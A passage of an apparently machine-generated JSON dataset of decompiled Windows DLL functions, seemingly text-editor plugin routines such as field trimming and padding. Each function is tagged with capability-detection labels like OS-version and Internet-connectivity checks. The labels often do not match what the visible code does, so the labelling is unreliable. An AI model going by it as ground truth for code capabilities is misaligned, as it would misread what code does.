if (var_70h_2 == 0) goto code_r0x0001800568d7;\n        fcn.180010d70(&stack0xfffffffffffffe58, 0x1800f8234, 0);\n        uStack152 = &stack0xfffffffffffffe78;\n        puVar19 = &stack0xfffffffffffffe78;\n        fcn.180011120(puVar19, \"FoldLevelAuto\", 0xd);\n        puVar22 = &var_80h_2;\n        if (0xf < var_68h) {\n            puVar22 = puVar16;\n        }\n        if (uVar17 < 0x10) {\ncode_r0x000180056879:\n            ppuVar12 = fcn.1800065d0(puVar19, &stack0xfffffffffffffe98, &stack0xfffffffffffffe30, \n                                     &stack0xfffffffffffffe78);\n            bVar6 = true;\n            ppuVar2 = ppuVar12 + 2;\n            if (0xf < ppuVar12[3]) {\n                ppuVar12 = *ppuVar12;\n            }\n            if (*ppuVar2 == 0x1) {\n                if (*ppuVar12 == 0x59) {\n                    uVar9 = 0;\n                }\n                else {\n                    uVar9 = -(*ppuVar12 < 0x59) | 1;\n                }\n                if (uVar9 != 0) goto code_r0x0001800568d7;\n                bVar5 = true;\n            }\n            else {\ncode_r0x0001800568d7:\n                bVar5 = false;\n            }\n            uVar14 = 0;\n            if ((bVar6) && (0xf < in_stack_fffffffffffffeb0)) {\n                iVar13 = in_stack_fffffffffffffe98;\n                if ((0xfff < in_stack_fffffffffffffeb0 + 1) &&\n                   (iVar13 = *(in_stack_fffffffffffffe98 + -8),  0x1f < (in_stack_fffffffffffffe98 - iVar13) - 8U))\n                goto code_r0x000180056b1c;\n                fcn.18008fb24(iVar13);\n            }\n            if (bVar5) {\n                puVar22 = &var_80h_2;\n                if (0xf < var_68h) {\n                    puVar22 = puVar16;\n                }\n                if (0xf < uVar17) {\n                    uVar21 = uVar17 | 0xf;\n                    if (0x7fffffffffffffff < uVar21) {\n                        uVar21 = 0x7fffffffffffffff;\n                    }\n                    arg1_00 = uVar21 + 1;\n                    if (arg1_00 < 0x1000) {\n                        if (arg1_00 != 0) {\n                            uVar14 = fcn.18008fb2c(arg1_00);\n                        }\n                    }\n                    else {\n                        uVar21 = uVar21 + 0x28;\n                        if (uVar21 <= arg1_00) {\n                            uVar21 = 0xffffffffffffffff;\n                        }\n                        iVar13 = fcn.18008fb2c(uVar21);\n                        if (iVar13 == 0) goto code_r0x000180056b22;\n                        uVar14 = iVar13 + 0x27U & 0xffffffffffffffe0;\n                        *(uVar14 - 8) = iVar13;\n                    }\n                    fcn.1800ade80(uVar14, puVar22, uVar17 + 1);\n                }\n                fcn.1800619e0(arg1, &stack0xfffffffffffffe30);\n            }\n            uVar24 = (**0x1800de798)(arg1[3], 0x2379);\n            (**0x1800de770)(uVar24, uVar17 != 0);\n            fcn.1800613b0();\n            if (0xf < var_68h) {\n                puVar22 = puVar16;\n                if ((0xfff < var_68h + 1) && (puVar22 = puVar16[-1],  0x1f < puVar16 + (-8 - puVar22))) {\n                    fcn.1800b3528();\n                    goto code_r0x000180056b04;\n                }\n                fcn.18008fb24(puVar22);\n            }\n            if (7 < var_bp_48h) {\n                iVar18 = CONCAT62(var_60h._2_6_, var_60h);\n                iVar13 = iVar18;\n                if ((0xfff < var_bp_48h * 2 + 2) && (iVar13 = *(iVar18 + -8),  0x1f < (iVar18 - *(iVar18 + -8)) - 8U))\n                goto code_r0x000180056b04;\n                goto code_r0x000180056a8d;\n            }\n            goto code_r0x000180056a92;\n        }\n        uVar14 = uVar17 | 0xf;\n        if (0x7fffffffffffffff < uVar14) {\n            uVar14 = 0x7fffffffffffffff;\n        }\n        puVar19 = uVar14 + 1;\n        if (puVar19 < 0x1000) {\n            if (puVar19 != NULL) {\n                puVar19 = fcn.18008fb2c(puVar19);\n            }\ncode_r0x000180056865:\n            fcn.1800ade80(puVar19, puVar22, uVar17 + 1);\n            goto code_r0x000180056879;\n        }\n        arg1_02 = uVar14 + 0x28;\n        if (arg1_02 <= puVar19) {\n            arg1_02 = 0xffffffffffffffff;\n        }\n        iVar13 = fcn.18008fb2c(arg1_02);\n        if (iVar13 != 0) {\n            puVar19 = iVar13 + 0x27U & 0xffffffffffffffe0;\n            *(puVar19 + -8) = iVar13;\n            goto code_r0x000180056865;\n        }\n    }\ncode_r0x000180056b1c:\n    fcn.1800b3528();\ncode_r0x000180056b22:\n    fcn.1800b3528();\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 5190
    },
    "180056b3": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.180056b30(ulong noname_0, ulong arg2)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    code *pcVar3;\n    uint16_t **ppuVar4;\n    ulong ****ppppuVar5;\n    int64_t iVar6;\n    uint16_t *puVar7;\n    int64_t iVar8;\n    uint16_t **ppuVar9;\n    uint64_t uVar10;\n    uint16_t **ppuVar11;\n    int64_t iVar12;\n    bool bVar13;\n    bool bVar14;\n    ulong var_88h;\n    uchar auStack104 [32];\n    ulong uStack72;\n    ulong ****appppuStack64 [2];\n    uint16_t *puStack48;\n    uint64_t uStack40;\n    uint64_t uStack32;\n    \n    uStack72 = 0xfffffffffffffffe;\n    uStack32 = *0x180123080 ^ auStack104;\n    uVar10 = 0;\n    puStack48 = NULL;\n    uStack40 = 7;\n    appppuStack64[0] = appppuStack64[0] & 0xffffffffffff0000;\n    appppuStack64[0] = fcn.180011cf0(appppuStack64, 0x108);\n    puStack48 = 0x104;\n    uStack40 = 0x107;\n    ppppuVar5 = appppuStack64[0];\n    for (iVar6 = 0x104; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *ppppuVar5 = 0;\n        ppppuVar5 = ppppuVar5 + 2;\n    }\n    *(appppuStack64[0] + 0x41) = 0;\n    (**0x1800de7f0)(*0x18012a390, 0x822, arg2, appppuStack64[0]);\n    ppppuVar5 = appppuStack64;\n    if (7 < uStack40) {\n        ppppuVar5 = appppuStack64[0];\n    }\n    iVar6 = -1;\n    do {\n        iVar6 = iVar6 + 1;\n    } while (*(ppppuVar5 + iVar6 * 2) != 0);\n    fcn.180010d70(appppuStack64, ppppuVar5, iVar6);\n    ppuVar4 = *0x1801248a0;\n    iVar6 = *0x1801248a0 - *0x180124898 >> 0x3f;\n    iVar8 = (*0x1801248a0 - *0x180124898) / 0x88 + iVar6;\n    ppuVar9 = *0x180124898;\n    if (iVar8 != iVar6) {\n        do {\n            ppppuVar5 = appppuStack64;\n            if (7 < uStack40) {\n                ppppuVar5 = appppuStack64[0];\n            }\n            puVar7 = ppuVar9[2];\n            ppuVar11 = ppuVar9;\n            if (0x7 < ppuVar9[3]) {\n                ppuVar11 = *ppuVar9;\n            }\n            if (puVar7 == puStack48) {\n                if (puVar7 == NULL) {\ncode_r0x000180056cbb:\n                    ppuVar9 = *0x180124898 + uVar10 * 0x11 + 0x11;\n                    if (ppuVar9 != *0x1801248a0) {\n                        ppuVar11 = ppuVar9 + -9;\n                        do {\n                            fcn.18000d960(ppuVar11 + -8, ppuVar9);\n                            fcn.18000dd60(ppuVar11 + -4, ppuVar11 + 0xd);\n                            fcn.18000dd60(ppuVar11, ppuVar11 + 0x11);\n                            fcn.18000dd60(ppuVar11 + 4, ppuVar11 + 0x15);\n                            *(ppuVar11 + 8) = *(ppuVar11 + 0x19);\n                            ppuVar9 = ppuVar9 + 0x11;\n                            ppuVar11 = ppuVar11 + 0x11;\n                        } while (ppuVar9 != ppuVar4);\n                    }\n                    fcn.180060170(*0x1801248a0 + -0x11);\n                    *0x1801248a0 = *0x1801248a0 + -0x11;\n                    break;\n                }\n                uVar1 = *ppuVar11;\n                uVar2 = *ppppuVar5;\n                if (uVar2 <= uVar1) {\n                    iVar12 = ppuVar11 - ppppuVar5;\n                    bVar13 = uVar1 < uVar2;\n                    bVar14 = uVar1 == uVar2;\n                    do {\n                        if (!bVar13 && !bVar14) break;\n                        if (puVar7 == 0x1) goto code_r0x000180056cbb;\n                        puVar7 = puVar7 + -1;\n                        ppppuVar5 = ppppuVar5 + 2;\n                        uVar1 = *(ppppuVar5 + iVar12);\n                        bVar13 = uVar1 < *ppppuVar5;\n                        bVar14 = uVar1 == *ppppuVar5;\n                    } while (!bVar13);\n                }\n            }\n            uVar10 = uVar10 + 1;\n            ppuVar9 = ppuVar9 + 0x11;\n        } while (uVar10 < iVar8 - iVar6);\n    }\n    if (7 < uStack40) {\n        ppppuVar5 = appppuStack64[0];\n        if ((0xfff < uStack40 * 2 + 2) &&\n           (ppppuVar5 = appppuStack64[0][-1],  0x1f < appppuStack64[0] + (-8 - ppppuVar5))) {\n            fcn.1800b3528();\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n        fcn.18008fb24(ppppuVar5);\n    }\n    fcn.18008fb00(uStack32 ^ auStack104);\n    return;\n}\n",
        "token_count": 1440
    },
    "1800570c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800570c0(int64_t arg1)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    bool bVar3;\n    uint64_t uVar4;\n    char cVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    ulong *puVar8;\n    ulong arg1_00;\n    uint32_t *puVar9;\n    uint64_t uVar10;\n    uint32_t *puVar11;\n    uchar *arg1_01;\n    uint64_t uVar12;\n    uint32_t *arg1_02;\n    int64_t iVar13;\n    uint32_t *puVar14;\n    int64_t iVar15;\n    uint64_t uVar16;\n    int32_t iVar17;\n    int64_t iVar18;\n    ulong *arg3;\n    int32_t iVar19;\n    int64_t iVar20;\n    uint64_t uVar21;\n    uchar auStack504 [32];\n    int32_t *piStack472;\n    int32_t *piStack464;\n    int32_t aiStack456 [2];\n    uint32_t uStack448;\n    uint uStack444;\n    uint uStack440;\n    uint uStack436;\n    uint64_t uStack432;\n    uint64_t uStack424;\n    int32_t iStack416;\n    int32_t iStack412;\n    int64_t iStack408;\n    int32_t iStack400;\n    uint32_t *puStack392;\n    uchar auStack384 [16];\n    ulong uStack368;\n    ulong uStack360;\n    ulong uStack352;\n    uint32_t uStack344;\n    uint uStack340;\n    uint uStack336;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    int64_t aiStack312 [3];\n    uint64_t uStack288;\n    uchar auStack280 [128];\n    int32_t iStack152;\n    int64_t iStack144;\n    int64_t iStack136;\n    uint32_t *puStack128;\n    uint32_t uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint64_t uStack104;\n    uint64_t uStack96;\n    uint32_t uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint64_t uStack72;\n    uint64_t uStack64;\n    uint64_t uStack56;\n    \n    uStack352 = 0xfffffffffffffffe;\n    uStack56 = *0x180123080 ^ auStack504;\n    if (-1 < *(arg1 + 0xc0)) {\n        iVar18 = -1;\n        iStack152 = -1;\n        (**0x1800de7f0)(*0x18012a390, 0x7ec);\n        if (iStack152 < 0) goto code_r0x00018005775f;\n        iVar13 = *0x18012a398;\n        if (iStack152 != 0) {\n            iVar13 = *0x18012a3a0;\n        }\n        iStack408 = iVar13;\n        if (iVar13 == 0) goto code_r0x00018005775f;\n        iVar17 = 0;\n        iVar19 = 0;\n        aiStack456[0] = 0;\n        iStack412 = 0;\n        uVar1 = *(arg1 + 0xc0);\n        uStack432 = 0;\n        uStack424 = 0xf;\n        uStack448 = uStack448 & 0xffffff00;\n        fcn.180011120(&uStack448, 0x1800f47e3, 0);\n        piStack464 = &iStack412;\n        piStack472 = aiStack456;\n        iVar6 = fcn.18005ba70(arg1, &uStack448, uVar1, 0);\n        if (iVar6 < 0) goto code_r0x00018005775f;\n        iVar20 = iStack412;\n        iVar15 = aiStack456[0];\n        iVar6 = iStack412 - aiStack456[0];\n        iStack416 = iVar6;\n        if (iVar6 < 1) goto code_r0x00018005775f;\n        uStack432 = 0;\n        uStack424 = 0xf;\n        uStack448 = uStack448 & 0xffffff00;\n        puVar11 = &uStack448;\n        fcn.180011120(puVar11, \"CopyFieldTrim\", 0xd);\n        cVar5 = fcn.180007d40(puVar11, &uStack448);\n        if (cVar5 == '\\0') {\n            (**0x1800de7f0)(iVar13, 0x973, iVar15, iVar20);\n            goto code_r0x00018005775f;\n        }\n        uStack72 = 0;\n        uStack64 = 0xf;\n        uStack88 = uStack88 & 0xffffff00;\n        puStack392 = &uStack448;\n        uStack432 = 0;\n        uStack424 = 0xf;\n        uStack448 = uStack448 & 0xffffff00;\n        fcn.180011120(&uStack448, 0x1800f482b, 0);\n        iVar13 = 0x1800fcb60;\n        if (*(arg1 + 0xc6) != '\\0') {\n            iVar13 = 0x1800fcb70;\n        }\n        uStack368 = 0;\n        uStack360 = 0xf;\n        auStack384[0] = 0;\n        iVar15 = -1;\n        do {\n            iVar15 = iVar15 + 1;\n        } while (*(iVar13 + iVar15) != '\\0');\n        arg1_01 = auStack384;\n        fcn.180011120(arg1_01, iVar13, iVar15);\n        puVar8 = fcn.180007730(arg1_01, aiStack312, auStack384, &uStack448);\n        arg1_00 = fcn.1800687b0(auStack280);\n        arg3 = puVar8;\n        if (7 < puVar8[3]) {\n            arg3 = *puVar8;\n        }\n        fcn.180068c50(arg1_00, &uStack344, arg3, arg3 + puVar8[2] * 2);\n        fcn.1800686c0(auStack280);\n        uStack88 = uStack344;\n        uStack84 = uStack340;\n        uStack80 = uStack336;\n        uStack76 = uStack332;\n        uStack72 = CONCAT44(uStack324, uStack328);\n        uStack64 = CONCAT44(uStack316, uStack320);\n        if (7 < uStack288) {\n            iVar13 = aiStack312[0];\n            if ((0xfff < uStack288 * 2 + 2) && (iVar13 = *(aiStack312[0] + -8),  0x1f < (aiStack312[0] - iVar13) - 8U))\n            goto code_r0x00018005780c;\n            fcn.18008fb24(iVar13);\n        }\n        if (CONCAT44(uStack324, uStack328) == 0) {\n            fcn.180011120(&uStack88, 0x1800f8274, 1);\n        }\n        iVar7 = 0;\n        uStack104 = 0;\n        uStack96 = 0xf;\n        uStack120 = uStack120 & 0xffffff00;\n        fcn.180010fa0(&uStack120, iVar6 + 1);\n        iVar13 = iStack408;\n        puStack128 = &uStack120;\n        if (0xf < uStack96) {\n            puStack128 = CONCAT44(uStack116, uStack120);\n        }\n        iStack144 = aiStack456[0];\n        iStack136 = iVar20;\n        (**0x1800de7f0)(iStack408, 0x872, 0, &iStack144);\n        puVar11 = &uStack120;\n        if (0xf < uStack96) {\n            puVar11 = CONCAT44(uStack116, uStack120);\n        }\n        uStack432 = CONCAT44(*0x180101914, *0x180101910);\n        uStack424 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack448 = uStack448 & 0xffffff00;\n        do {\n            iVar18 = iVar18 + 1;\n        } while (*(puVar11 + iVar18) != '\\0');\n        fcn.180011120(&uStack448, puVar11, iVar18);\n        if (0xf < uStack96) {\n            iVar15 = CONCAT44(uStack116, uStack120);\n            iVar18 = iVar15;\n            if ((0xfff < uStack96 + 1) && (iVar18 = *(iVar15 + -8),  0x1f < (iVar15 - iVar18) - 8U))\n            goto code_r0x000180057818;\n            fcn.18008fb24(iVar18);\n        }\n        uStack120 = uStack448;\n        uStack116 = uStack444;\n        uStack112 = uStack440;\n        uStack108 = uStack436;\n        uStack104 = uStack432;\n        uStack96 = uStack424;\n        puVar11 = CONCAT44(uStack84, uStack88);\n        if (*(arg1 + 0xc6) == '\\0') {\n            uVar21 = 0;\n            while (iVar13 = iStack408,  uVar21 < iVar6) {\n                uVar10 = 0;\n                if (0 < uStack72) {\n                    do {\n                        if (uStack432 <= uVar21) goto code_r0x00018005781e;\n                        puVar14 = &uStack120;\n                        if (0xf < uStack424) {\n                            puVar14 = CONCAT44(uStack444, uStack448);\n                        }\n                        if (uStack72 <= uVar10) goto code_r0x00018005781e;\n                        puVar9 = &uStack88;\n                        if (0xf < uStack64) {\n                            puVar9 = puVar11;\n                        }\n                        if (*(puVar14 + uVar21) != *(puVar9 + uVar10)) goto code_r0x0001800576a4;\n                        iVar17 = iVar17 + 1;\n                        uVar21 = uVar21 + 1;\n                        uVar10 = uVar10 + 1;\n                    } while (uVar10 < uStack72);\n                }\n            }\n        }\n        else {\n            iVar19 = 0;\n            iVar17 = 0;\n            if (uStack72 <= iVar6) {\n                iStack400 = iVar6 - uStack72;\n                uVar21 = iStack400;\n                uVar16 = 0;\n                uVar10 = uVar21;\n                iVar19 = uStack72;\njoined_r0x0001800574d2:\n                do {\n                    if (iVar19 < 1) break;\n                    uVar12 = 0;\n                    if (0 < iVar19) {\n                        uVar4 = uVar10 & 0xffffffff;\n                        do {\n                            uVar16 = uVar4;\n                            if (uStack432 <= uVar21 + uVar12) goto code_r0x00018005781e;\n                            puVar14 = &uStack120;\n                            if (0xf < uStack424) {\n                                puVar14 = CONCAT44(uStack444, uStack448);\n                            }\n                            if (uStack72 <= uVar12) goto code_r0x00018005781e;\n                            puVar9 = &uStack88;\n                            if (0xf < uStack64) {\n                                puVar9 = puVar11;\n                            }\n                            if (*(puVar14 + uVar21 + uVar12) != *(uVar12 + puVar9)) {\n                                iVar19 = iVar19 + -1;\n                                uVar10 = uVar10 + 1;\n                                uVar21 = uVar21 + 1;\n                                goto joined_r0x0001800574d2;\n                            }\n                            uVar12 = uVar12 + 1;\n                            uVar4 = uVar16 + 1;\n                        } while (uVar12 < iVar19);\n                    }\n                } while (uVar16 != iStack416 + -1);\n                iVar13 = iStack408;\n                iVar17 = 0;\n                if ((0 < iVar19) && (iVar6 = uStack72 + iVar19,  iVar17 = iVar7,  iVar6 <= iStack416)) {\n                    puStack392 = puStack392 & 0xffffffff00000000 | -uStack72;\n                    iStack400 = iStack400 - iVar19;\n                    do {\n                        uVar21 = iStack400;\n                        uStack432 = 0;\n                        uStack424 = 0xf;\n                        uStack448 = uStack448 & 0xffffff00;\n                        if (uStack104 < uVar21) {\ncode_r0x00018005781e:\n                            fcn.180011cd0();\n                            pcVar2 = swi(3);\n                            (*pcVar2)();\n                            return;\n                        }\n                        uVar10 = uStack72;\n                        if (uStack104 - uVar21 < uStack72) {\n                            uVar10 = uStack104 - uVar21;\n                        }\n                        puVar14 = &uStack120;\n                        if (0xf < uStack96) {\n                            puVar14 = CONCAT44(uStack116, uStack120);\n                        }\n                        fcn.180011120(&uStack448, puVar14 + uVar21, uVar10);\n                        puVar14 = &uStack88;\n                        if (0xf < uStack64) {\n                            puVar14 = puVar11;\n                        }\n                        puVar9 = CONCAT44(uStack444, uStack448);\n                        arg1_02 = &uStack448;\n                        if (0xf < uStack424) {\n                            arg1_02 = puVar9;\n                        }\n                        if ((uStack432 == uStack72) && (iVar7 = fcn.1800ae4d0(arg1_02, puVar14, uStack432),  iVar7 == 0)\n                           ) {\n                            bVar3 = true;\n                        }\n                        else {\n                            bVar3 = false;\n                        }\n                        if (0xf < uStack424) {\n                            puVar14 = puVar9;\n                            if ((0xfff < uStack424 + 1) && (puVar14 = *(puVar9 + -2),  0x1f < puVar9 + (-8 - puVar14)))\n                            goto code_r0x000180057818;\n                            fcn.18008fb24(puVar14);\n                        }\n                        iVar13 = iStack408;\n                        if (!bVar3) break;\n                        iVar19 = iVar19 + uStack72;\n                        iStack400 = iStack400 + puStack392;\n                        iVar6 = iVar6 + uStack72;\n                    } while (iVar6 <= iStack416);\n                }\n            }\n        }\ncode_r0x0001800576a4:\n        if (aiStack456[0] + iVar17 < iStack412 - iVar19) {\n            (**0x1800de7f0)(iVar13, 0x973, aiStack456[0] + iVar17, iStack412 - iVar19);\n        }\n        if (0xf < uStack96) {\n            iVar13 = CONCAT44(uStack116, uStack120);\n            iVar18 = iVar13;\n            if (0xfff < uStack96 + 1) {\n                iVar18 = *(iVar13 + -8);\n                if (0x1f < (iVar13 - iVar18) - 8U) {\n                    fcn.1800b3528(iVar18, uStack96 + 0x28);\ncode_r0x000180057818:\n                    fcn.1800b3528();\n                    pcVar2 = swi(3);\n                    (*pcVar2)();\n                    return;\n                }\n            }\n            fcn.18008fb24(iVar18);\n        }\n        uStack104 = 0;\n        uStack96 = 0xf;\n        uStack120 = uStack120 & 0xffffff00;\n        if (0xf < uStack64) {\n            puVar14 = puVar11;\n            if ((0xfff < uStack64 + 1) && (puVar14 = *(puVar11 + -2),  0x1f < puVar11 + (-8 - puVar14))) {\n                fcn.1800b3528();\ncode_r0x00018005780c:\n                fcn.1800b3528();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            fcn.18008fb24(puVar14);\n        }\n    }\ncode_r0x00018005775f:\n    fcn.18008fb00(uStack56 ^ auStack504);\n    return;\n}\n",
        "token_count": 3785
    },
    "18005783": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180057830(int64_t arg1)\n\n{\n    ushort *arg1_00;\n    uint32_t uVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    ulong uVar6;\n    ushort *puVar7;\n    uint *puVar8;\n    uint64_t uVar9;\n    uchar *puVar10;\n    char *arg2;\n    uchar *puVar11;\n    int32_t *arg2_00;\n    int64_t iVar12;\n    uint64_t uVar13;\n    bool bVar14;\n    uchar auStack456 [32];\n    int32_t *piStack424;\n    ulong *puStack416;\n    int32_t aiStack408 [2];\n    uchar uStack400;\n    uchar uStack399;\n    ushort uStack398;\n    uint uStack396;\n    uint uStack392;\n    uint uStack388;\n    uint64_t uStack384;\n    uint64_t uStack376;\n    ulong uStack368;\n    int32_t iStack360;\n    uchar uStack352;\n    unkbyte7 Stack351;\n    ulong uStack336;\n    uint64_t uStack328;\n    int64_t iStack320;\n    int64_t iStack312;\n    ulong uStack304;\n    uchar auStack280 [128];\n    int32_t iStack152;\n    uint uStack144;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint64_t uStack128;\n    uint64_t uStack120;\n    ushort uStack112;\n    ushort uStack110;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint64_t uStack96;\n    uint64_t uStack88;\n    uchar uStack80;\n    unkbyte7 Stack79;\n    int32_t *piStack64;\n    uint64_t uStack56;\n    uint64_t uStack48;\n    \n    uStack304 = 0xfffffffffffffffe;\n    uStack48 = *0x180123080 ^ auStack456;\n    uStack368 = uStack368 & 0xffffffff00000000;\n    iStack320 = arg1;\n    if (*(arg1 + 0xc0) < 0) goto code_r0x000180057f41;\n    iVar12 = -1;\n    iStack152 = -1;\n    (**0x1800de7f0)(*0x18012a390, 0x7ec);\n    if (iStack152 < 0) goto code_r0x000180057f41;\n    iStack312 = *0x18012a398;\n    if (iStack152 != 0) {\n        iStack312 = *0x18012a3a0;\n    }\n    if (iStack312 == 0) goto code_r0x000180057f41;\n    aiStack408[0] = 0;\n    uStack368 = uStack368 & 0xffffffff00000000;\n    uVar1 = *(arg1 + 0xc0);\n    piStack64 = NULL;\n    uStack56 = 0xf;\n    uStack80 = 0;\n    fcn.180011120(&uStack80, 0x1800f482e, 0);\n    puStack416 = &uStack368;\n    piStack424 = aiStack408;\n    iVar4 = fcn.18005ba70(arg1, &uStack80, uVar1, 0);\n    if (iVar4 < 0) goto code_r0x000180057f41;\n    iStack360 = uStack368 - aiStack408[0];\n    if (iStack360 < 1) goto code_r0x000180057f41;\n    iVar4 = *(*(*(arg1 + 0xb8) * 0xe8 + 0xa0 + *(arg1 + 0x160)) + *(arg1 + 0xc0) * 4);\n    uStack128 = 0;\n    uStack120 = 7;\n    uStack144._0_2_ = 0;\n    uVar6 = (**0x1800de760)(*(arg1 + 0x18));\n    fcn.180067f10(uVar6, &uStack144);\n    if (uStack128 < 1) {\ncode_r0x000180057f05:\n        if (uStack120 < 8) goto code_r0x000180057f41;\n        iVar3 = CONCAT44(uStack140, CONCAT22(uStack144._2_2_, uStack144));\n        iVar12 = iVar3;\n        if (0xfff < uStack120 * 2 + 2) {\n            iVar12 = *(iVar3 + -8);\n            if (0x1f < (iVar3 - iVar12) - 8U) {\n                fcn.1800b3528(iVar12, uStack120 * 2 + 0x29);\n                goto code_r0x000180057f77;\n            }\n        }\n        fcn.18008fb24(iVar12);\ncode_r0x000180057f41:\n        fcn.18008fb00(uStack48 ^ auStack456);\n        return;\n    }\n    if (iVar4 < uStack128) {\n        iVar5 = 0;\n        if (*(arg1 + 0xc6) == '\\0') {\n            iVar5 = uStack128 - iVar4;\n        }\n        uVar9 = iVar5;\n        uStack384 = CONCAT44(*0x180101904, *0x180101900);\n        uStack376 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack400 = 0;\n        uStack399 = 0;\n        if (uStack128 < uVar9) {\ncode_r0x000180057f77:\n            fcn.180011cd0();\n        }\n        else {\n            uVar13 = iVar4;\n            if (uStack128 - uVar9 < iVar4) {\n                uVar13 = uStack128 - uVar9;\n            }\n            puVar7 = &uStack144;\n            if (7 < uStack120) {\n                puVar7 = CONCAT44(uStack140, CONCAT22(uStack144._2_2_, uStack144));\n            }\n            fcn.180010d70(&uStack400, puVar7 + uVar9, uVar13);\n            if (uStack120 < 8) {\ncode_r0x000180057a53:\n                uStack144._0_2_ = CONCAT11(uStack399, uStack400);\n                uStack144._2_2_ = uStack398;\n                uStack140 = uStack396;\n                uStack136 = uStack392;\n                uStack132 = uStack388;\n                uStack128 = uStack384;\n                uStack120 = uStack376;\n                goto code_r0x000180057e51;\n            }\n            iVar3 = CONCAT44(uStack140, CONCAT22(uStack144._2_2_, uStack144));\n            iVar12 = iVar3;\n            if ((uStack120 * 2 + 2 < 0x1000) || (iVar12 = *(iVar3 + -8),  (iVar3 - iVar12) - 8U < 0x20)) {\n                fcn.18008fb24(iVar12);\n                goto code_r0x000180057a53;\n            }\n        }\n        fcn.1800b3528();\ncode_r0x000180057f83:\n        fcn.1800b3528();\ncode_r0x000180057f89:\n        fcn.1800b3528();\ncode_r0x000180057f8f:\n        fcn.1800b3528();\n    }\n    else {\n        if (iVar4 <= uStack128) {\ncode_r0x000180057e51:\n            iVar12 = aiStack408[0];\n            (**0x1800de7f0)(iStack312, 0xa55, iVar12, iStack360);\n            uVar6 = fcn.1800687b0(auStack280);\n            puVar7 = &uStack144;\n            if (7 < uStack120) {\n                puVar7 = CONCAT44(uStack140, CONCAT22(uStack144._2_2_, uStack144));\n            }\n            fcn.180068c50(uVar6, &uStack400, puVar7, puVar7 + uStack128);\n            fcn.1800686c0(auStack280);\n            puVar10 = &uStack400;\n            if (0xf < uStack376) {\n                puVar10 = CONCAT44(uStack396, CONCAT22(uStack398, CONCAT11(uStack399, uStack400)));\n            }\n            (**0x1800de7f0)(iStack312, 0x7d3, iVar12, puVar10);\n            if (0xf < uStack376) {\n                iVar3 = CONCAT44(uStack396, CONCAT22(uStack398, CONCAT11(uStack399, uStack400)));\n                iVar12 = iVar3;\n                if (0xfff < uStack376 + 1) {\n                    iVar12 = *(iVar3 + -8);\n                    if (0x1f < (iVar3 - iVar12) - 8U) {\n                        fcn.1800b3528(iVar12, uStack376 + 0x28);\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                }\n                fcn.18008fb24(iVar12);\n            }\n            goto code_r0x000180057f05;\n        }\n        iVar4 = iVar4 - uStack128;\n        uStack368 = &uStack352;\n        uStack336 = 0;\n        uStack328 = 0xf;\n        uStack352 = 0;\n        fcn.180011120(&uStack352, 0x1800f482f, 0);\n        arg2 = \"PasteFieldLPAD\";\n        if (*(arg1 + 0xc6) != '\\0') {\n            arg2 = \"PasteFieldRPAD\";\n        }\n        uStack384 = 0;\n        uStack376 = 0xf;\n        uStack400 = 0;\n        do {\n            iVar12 = iVar12 + 1;\n        } while (arg2[iVar12] != '\\0');\n        puVar10 = &uStack400;\n        fcn.180011120(puVar10, arg2, iVar12);\n        fcn.180007730(puVar10, &uStack80, &uStack400, &uStack352);\n        if (piStack64 == NULL) {\n            fcn.180010d70(&uStack80, 0x1800f8284, 1);\n        }\n        uStack96 = 0;\n        uStack88 = 7;\n        uStack112 = 0;\n        uVar9 = uStack56;\n        if (iVar4 < 1) {\n            puVar10 = CONCAT71(Stack79, uStack80);\n        }\n        else {\n            puVar10 = CONCAT71(Stack79, uStack80);\n            arg2_00 = piStack64;\n            do {\n                puVar11 = &uStack80;\n                if (7 < uVar9) {\n                    puVar11 = puVar10;\n                }\n                if (uStack88 - uStack96 < arg2_00) {\n                    piStack424 = arg2_00;\n                    fcn.180013690(&uStack112, arg2_00, 0, puVar11);\n                    puVar10 = CONCAT71(Stack79, uStack80);\n                    arg2_00 = piStack64;\n                    uVar9 = uStack56;\n                }\n                else {\n                    uVar13 = arg2_00 + uStack96;\n                    puVar7 = &uStack112;\n                    if (7 < uStack88) {\n                        puVar7 = CONCAT44(uStack108, CONCAT22(uStack110, 